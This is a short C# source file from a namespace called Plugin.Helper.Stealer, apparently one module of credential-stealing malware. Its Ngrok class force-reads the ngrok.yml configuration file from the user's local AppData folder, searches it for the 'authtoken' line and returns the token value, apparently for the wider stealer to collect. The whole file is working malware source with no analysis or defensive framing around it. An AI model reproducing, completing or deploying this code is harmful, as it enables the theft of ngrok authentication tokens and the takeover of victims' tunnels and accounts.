

using System;
using System.IO;
using InvokedCommon.Structs;


namespace Plugin.Helper.Stealer
{
	public static class Ngrok
	{
		public static NgrokInfo? GetInfo()
		{
			string str1 = Path.Combine(Configuration.localAppData, "ngrok\\ngrok.yml");
			if (!File.Exists(str1))
				return new NgrokInfo?();
			string str2 = Utils.ForceReadFileString(str1);
			if (str2 == null)
				return new NgrokInfo?();
			string str3 = str2;
			string[] separator = new string[3]
			{
				"\r\n",
				"\r",
				"\n"
			};
			foreach (string str4 in str3.Split(separator, StringSplitOptions.None))
			{
				if (str4.ToLower().StartsWith("authtoken") && str4.Contains(":") && str4.IndexOf(':') < str4.Length - 1)
					return new NgrokInfo?(new NgrokInfo(str4.Split(':')[1].Trim()));
			}
			return new NgrokInfo?();
		}
	}
}
